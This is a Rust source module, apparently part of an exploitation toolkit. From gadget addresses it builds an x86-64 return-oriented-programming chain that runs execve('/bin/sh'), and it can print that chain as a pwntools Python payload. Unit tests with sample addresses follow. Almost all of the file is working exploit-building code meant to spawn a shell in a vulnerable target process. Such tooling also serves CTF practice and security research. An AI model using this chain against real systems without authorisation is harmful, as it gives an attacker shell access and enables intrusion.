//! Build a classic `execve("/bin/sh", NULL, NULL)` syscall ROP chain for
//! x86-64 from a set of gadget addresses. Gadget discovery lives in the plugin
//! layer (see `pwn::gadget`); this module assembles and renders the chain.

/// Addresses of the gadgets / data needed for an x86-64 execve syscall chain.
#[derive(Debug, Clone, Default)]
pub struct ExecveGadgets {
    pub pop_rdi: Option<u64>,
    pub pop_rsi: Option<u64>,
    pub pop_rdx: Option<u64>,
    pub pop_rax: Option<u64>,
    pub syscall: Option<u64>,
    /// Address of a `"/bin/sh"` string in the target.
    pub binsh: Option<u64>,
}

/// One entry pushed onto the ROP stack: a value and a human comment.
#[derive(Debug, Clone)]
pub struct ChainEntry {
    pub value: u64,
    pub comment: String,
}

/// Build the chain, or return the list of missing components.
pub fn build_execve_x64(g: &ExecveGadgets) -> Result<Vec<ChainEntry>, Vec<&'static str>> {
    let mut missing = Vec::new();
    if g.pop_rdi.is_none() { missing.push("pop rdi ; ret"); }
    if g.pop_rsi.is_none() { missing.push("pop rsi ; ret"); }
    if g.pop_rdx.is_none() { missing.push("pop rdx ; ret"); }
    if g.pop_rax.is_none() { missing.push("pop rax ; ret"); }
    if g.syscall.is_none() { missing.push("syscall"); }
    if g.binsh.is_none() { missing.push("\"/bin/sh\" string"); }
    if !missing.is_empty() {
        return Err(missing);
    }
    let e = |value: u64, comment: &str| ChainEntry { value, comment: comment.to_string() };
    Ok(vec![
        e(g.pop_rdi.unwrap(), "pop rdi ; ret"),
        e(g.binsh.unwrap(), "-> rdi = \"/bin/sh\""),
        e(g.pop_rsi.unwrap(), "pop rsi ; ret"),
        e(0, "-> rsi = 0 (argv)"),
        e(g.pop_rdx.unwrap(), "pop rdx ; ret"),
        e(0, "-> rdx = 0 (envp)"),
        e(g.pop_rax.unwrap(), "pop rax ; ret"),
        e(59, "-> rax = 59 (execve)"),
        e(g.syscall.unwrap(), "syscall"),
    ])
}

/// Render the chain as a pwntools-style Python snippet.
pub fn render_pwntools(chain: &[ChainEntry]) -> String {
    use std::fmt::Write as _;
    let mut s = String::from("from pwn import *\n\nrop  = b\"\"\n");
    for entry in chain {
        let _ = writeln!(s, "rop += p64(0x{:x})  # {}", entry.value, entry.comment);
    }
    s
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn missing_reported() {
        let g = ExecveGadgets::default();
        let err = build_execve_x64(&g).unwrap_err();
        assert!(err.contains(&"syscall"));
        assert!(err.contains(&"\"/bin/sh\" string"));
    }

    #[test]
    fn builds_full_chain() {
        let g = ExecveGadgets {
            pop_rdi: Some(0x401000),
            pop_rsi: Some(0x401002),
            pop_rdx: Some(0x401004),
            pop_rax: Some(0x401006),
            syscall: Some(0x401008),
            binsh: Some(0x402000),
        };
        let chain = build_execve_x64(&g).unwrap();
        assert_eq!(chain.len(), 9);
        assert_eq!(chain[0].value, 0x401000);
        assert_eq!(chain[1].value, 0x402000);
        assert_eq!(chain[7].value, 59); // execve number
        let py = render_pwntools(&chain);
        assert!(py.contains("p64(0x401000)") && py.contains("execve"));
    }
}
